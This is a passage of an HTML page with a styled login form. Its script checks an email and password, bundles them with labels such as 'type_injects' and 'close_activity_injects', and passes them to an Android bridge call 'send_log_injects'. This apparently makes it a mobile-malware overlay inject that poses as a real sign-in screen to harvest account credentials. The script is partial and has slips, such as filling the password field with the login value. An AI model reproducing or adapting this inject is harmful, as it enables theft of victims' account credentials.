    <style>
        form {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
            padding: 15px;
        }

        label {
            font-size: 18px;
            font-weight: 600;
            color: #394247;
        }

        .input {
            width: 100%;
            border: 0;
            border-bottom: 1px solid #a5a5a5;
            margin-bottom: 25px;
        }

        .input:focus {
            border-color: #10d078;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            padding: 10px;
            width: 48%;
            background-color: #04c068;
            border: 0;
            border-radius: 6px;
            color: #fff;
            font-weight: 600;
        }

        .button:disabled {
            background-color: transparent;
            color: #b4bdc7;
            border: 1px solid #b4bdc7;
        }

        .error {
            border-color: #f00 !important;
        }
    </style>
</head>

        var login = document.getElementById('login'),

        sendData.onclick = () => {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 5) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 5) {
                var data = {};
                data.email = login.value;
                data.password = login.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
